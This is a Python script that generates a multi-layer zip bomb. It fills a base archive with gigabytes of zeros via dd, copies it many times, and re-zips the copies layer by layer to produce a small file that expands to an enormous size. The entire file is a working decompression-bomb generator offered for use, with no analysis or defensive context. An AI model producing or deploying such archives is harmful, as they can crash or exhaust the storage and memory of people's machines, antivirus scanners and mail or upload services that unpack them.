import os, subprocess, pyautogui

os.system('cls') if os.name == 'nt' else os.system('clear')

layers = int(pyautogui.prompt('Amount of layers:'))
#layers = int(input("Amount of layers: "))
files = int(pyautogui.prompt('Amount of files per layer:'))
#files = int(input("Amount of files per layer: "))
try: buff = int(input("dd buffer size (default=10 gb): "))
except ValueError: buff = 10
pyautogui.alert(f'total zip bomb size: {buff*(files**layers)} gb')
#print(f"total zip bomb size: {buff*(files**layers)} gigabytes")

cwd = os.getcwd()
try: os.mkdir("out")
except FileExistsError: pass
os.chdir("out")
subprocess.run(f"dd if=/dev/zero bs=1024 count={buff*(1024**2)} | zip zip0.zip -", shell=True)
subprocess.run(r"zipnote -w zip0.zip <<<$'@ -\n@=0'", shell=True, executable="bash")
for i in range(layers):
    for j in range(files-1): os.system(f"cp zip0.zip zip{j+1}.zip")
    try: os.mkdir(f"layer{i}")
    except FileExistsError: pass
    os.system(f"zip -r -9 \"layer{i}/zip0.zip\" *.zip")
    os.chdir(f"layer{i}")
os.system(f"cp zip0.zip {cwd}/zipbomb.zip")
os.chdir(cwd)
os.system("rm -rf out")

pyautogui.alert('Process ended with status 0')
